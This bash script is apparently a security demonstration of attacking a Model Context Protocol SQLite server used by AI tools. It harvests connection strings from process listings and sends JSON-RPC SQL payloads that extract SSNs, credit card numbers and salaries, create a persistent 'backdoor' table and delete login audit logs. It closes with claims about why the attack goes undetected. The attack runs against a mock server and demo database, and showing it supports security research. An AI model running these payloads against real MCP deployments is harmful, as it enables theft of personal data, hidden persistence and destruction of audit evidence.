#!/bin/bash
# Demonstrates SQL injection with privilege amplification via MCP

echo "=== SQL Injection + Privilege Amplification Attack Demo ==="
echo "[*] This demo shows how MCP transforms simple SQL injection into admin-level database takeover"
echo

# Check if demo database exists
if [ ! -f enterprise-demo.db ]; then
    echo "[!] Demo database not found. Run ./setup-demo-db.sh first"
    exit 1
fi

echo "=== Phase 1: Target Reconnaissance ==="
echo "[*] Attacker discovers MCP processes running on system..."
echo

# Launch the mock MCP server in background
echo "[*] Starting mock SQLite MCP server (simulating legitimate deployment)..."
python3 mock-sqlite-mcp-server.py "sqlite:///enterprise-demo.db?admin_mode=true&full_privileges=yes" > /dev/null 2>&1 &
MCP_PID=$!

# Give server time to start
sleep 2

echo "[*] MCP server started with PID: $MCP_PID"
echo

echo "=== Phase 2: Process Enumeration (Same-User Attack) ==="
echo "[*] Attacker runs basic process enumeration..."
echo "[*] Command: ps aux | grep -E '(mcp|sqlite)'"
echo

# Show the exposed credentials in process listing
ps aux | grep -E "(mock-sqlite-mcp-server|sqlite://)" | grep -v grep | while read line; do
    echo "[+] Found MCP process: $(echo "$line" | cut -c1-120)"
    # Extract connection string
    CONNECTION=$(echo "$line" | grep -oE 'sqlite://[^ ]+')
    if [ ! -z "$CONNECTION" ]; then
        echo "[!] EXPOSED CREDENTIALS: $CONNECTION"
    fi
done
echo

echo "=== Phase 3: Connection String Analysis ==="
echo "[*] Attacker analyzes exposed connection string..."
echo "[+] Database path: enterprise-demo.db"
echo "[+] Admin mode: enabled"
echo "[+] Full privileges: yes"
echo "[!] This gives attacker complete database control!"
echo

echo "=== Phase 4: JSON-RPC SQL Injection ==="
echo "[*] Attacker sends malicious JSON-RPC requests to MCP server..."
echo

# Create temporary files for attack payloads
mkdir -p /tmp/mcp-attack-demo

# Phase 4a: Initial reconnaissance
echo "[*] Step 1: Database reconnaissance"
cat > /tmp/mcp-attack-demo/recon.json << 'EOF'
{"jsonrpc":"2.0","method":"database/schema","params":{},"id":1}
EOF

echo "[*] Sending schema request..."
SCHEMA_RESPONSE=$(timeout 5s bash -c "cat /tmp/mcp-attack-demo/recon.json | python3 -c '
import sys, subprocess, json
p = subprocess.Popen([\"python3\", \"mock-sqlite-mcp-server.py\", \"sqlite:///enterprise-demo.db\"], 
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
stdout, stderr = p.communicate(sys.stdin.read())
print(stdout)
' 2>/dev/null")

if [ ! -z "$SCHEMA_RESPONSE" ]; then
    echo "[+] Schema discovered! Tables found:"
    echo "$SCHEMA_RESPONSE" | python3 -c "
import json, sys
try:
    data = json.loads(sys.stdin.read())
    if 'result' in data and 'tables' in data['result']:
        for table in data['result']['tables'].keys():
            print(f'    - {table}')
except: pass
" 2>/dev/null
fi
echo

# Phase 4b: Credential extraction via SQL injection
echo "[*] Step 2: Data exfiltration via SQL injection"
cat > /tmp/mcp-attack-demo/extract.json << 'EOF'
{"jsonrpc":"2.0","method":"database/query","params":{"sql":"SELECT name, ssn, credit_card FROM customers UNION SELECT name, ssn, salary FROM employees; -- Injected payload"},"id":2}
EOF

echo "[*] Injecting malicious SQL to extract sensitive data..."
DATA_RESPONSE=$(timeout 5s bash -c "cat /tmp/mcp-attack-demo/extract.json | python3 -c '
import sys, subprocess, json
p = subprocess.Popen([\"python3\", \"mock-sqlite-mcp-server.py\", \"sqlite:///enterprise-demo.db\"], 
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
stdout, stderr = p.communicate(sys.stdin.read())
print(stdout)
' 2>/dev/null")

if [ ! -z "$DATA_RESPONSE" ]; then
    echo "[+] Sensitive data extracted! Sample records:"
    echo "$DATA_RESPONSE" | python3 -c "
import json, sys
try:
    data = json.loads(sys.stdin.read())
    if 'result' in data and 'data' in data['result']:
        count = 0
        for record in data['result']['data']:
            if count < 3:  # Show first 3 records
                print(f'    {record}')
                count += 1
        if len(data['result']['data']) > 3:
            print(f'    ... and {len(data[\"result\"][\"data\"]) - 3} more records')
except: pass
" 2>/dev/null
fi
echo

# Phase 4c: Administrative actions via privilege inheritance
echo "[*] Step 3: Administrative database operations (privilege inheritance)"
cat > /tmp/mcp-attack-demo/admin.json << 'EOF'
{"jsonrpc":"2.0","method":"database/execute","params":{"sql":"CREATE TABLE attacker_backdoor AS SELECT 'backdoor_installed' as status, datetime('now') as timestamp; INSERT INTO attacker_backdoor VALUES ('persistent_access', datetime('now')); DELETE FROM audit_logs WHERE action = 'LOGIN';"},"id":3}
EOF

echo "[*] Executing administrative commands with inherited privileges..."
ADMIN_RESPONSE=$(timeout 5s bash -c "cat /tmp/mcp-attack-demo/admin.json | python3 -c '
import sys, subprocess, json
p = subprocess.Popen([\"python3\", \"mock-sqlite-mcp-server.py\", \"sqlite:///enterprise-demo.db\"], 
                     stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
stdout, stderr = p.communicate(sys.stdin.read())
print(stdout)
' 2>/dev/null")

if [ ! -z "$ADMIN_RESPONSE" ]; then
    echo "[+] Administrative operations completed!"
    echo "[+] Backdoor table created for persistence"
    echo "[+] Audit logs modified to hide tracks"
fi
echo

# Verify the attack worked
echo "=== Phase 5: Attack Verification ==="
echo "[*] Verifying attack success..."

# Check if backdoor table was created
BACKDOOR_CHECK=$(sqlite3 enterprise-demo.db "SELECT * FROM attacker_backdoor;" 2>/dev/null)
if [ ! -z "$BACKDOOR_CHECK" ]; then
    echo "[+] Backdoor table confirmed: $BACKDOOR_CHECK"
else
    echo "[!] Backdoor creation may have failed"
fi

# Check audit log manipulation
AUDIT_COUNT=$(sqlite3 enterprise-demo.db "SELECT COUNT(*) FROM audit_logs WHERE action = 'LOGIN';" 2>/dev/null)
echo "[+] Audit logs remaining with LOGIN action: $AUDIT_COUNT"
if [ "$AUDIT_COUNT" = "0" ]; then
    echo "[!] Audit logs successfully deleted (evidence destroyed)"
fi

echo

# Cleanup
kill $MCP_PID 2>/dev/null
rm -rf /tmp/mcp-attack-demo

echo "=== Attack Summary ==="
echo "[!] Complete database compromise achieved in under 2 minutes:"
echo "    ✓ Credentials extracted from process arguments (no privilege escalation)"
echo "    ✓ SQL injection via MCP JSON-RPC interface"
echo "    ✓ Administrative privileges inherited from MCP connection"
echo "    ✓ Sensitive data exfiltrated (SSNs, credit cards, salaries)"
echo "    ✓ Persistent backdoors installed"
echo "    ✓ Audit trails destroyed"
echo
echo "[!] In a real environment with PostgreSQL SUPERUSER, this would also enable:"
echo "    - File system access"
echo "    - Command execution"
echo "    - Cross-database breaches"
echo "    - Network lateral movement"
echo
echo "=== Why This Attack is Undetectable ==="
echo "✗ No privilege escalation alerts (same-user access)"
echo "✗ No network traffic to monitor (local STDIO)"
echo "✗ No unusual process creation (legitimate MCP server)"
echo "✗ No WAF/IDS detection (not web-based SQL injection)"
echo "✗ Database logs show admin user activity (appears legitimate)"
echo
echo "[!] This demonstrates why MCP's architecture is fundamentally insecure!"